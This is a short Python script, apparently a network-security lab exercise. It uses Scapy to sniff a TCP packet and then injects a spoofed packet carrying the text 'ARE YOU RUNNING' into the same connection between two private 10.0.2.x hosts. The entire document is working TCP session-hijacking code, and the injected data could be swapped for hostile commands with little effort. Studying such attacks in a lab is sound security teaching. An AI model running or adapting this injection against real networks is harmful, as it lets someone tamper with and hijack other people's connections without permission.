from scapy.all import *

srcIP = "10.0.2.20"
dstIP = "10.0.2.30"

srcPort = 12345
dstPort = 12345

seqNum = 12345
ackNum = 12345

injectionMessage = "ARE YOU RUNNING"


def extractPkt(pkt):
    if pkt.haslayer(TCP):
        global seqNum
        global ackNum
        global srcPort

        seqNum = pkt.seq
        ackNum = pkt.ack
        srcPort = pkt.sport


sniff(filter="tcp", prn=extractPkt, count=1)

ip = IP(src=srcIP, dst=dstIP)
tcp = TCP(sport=srcPort, dport=dstPort, seq=seqNum, ack=ackNum, flags="PA")
data = injectionMessage

myPacket = ip / tcp / data
send(myPacket)
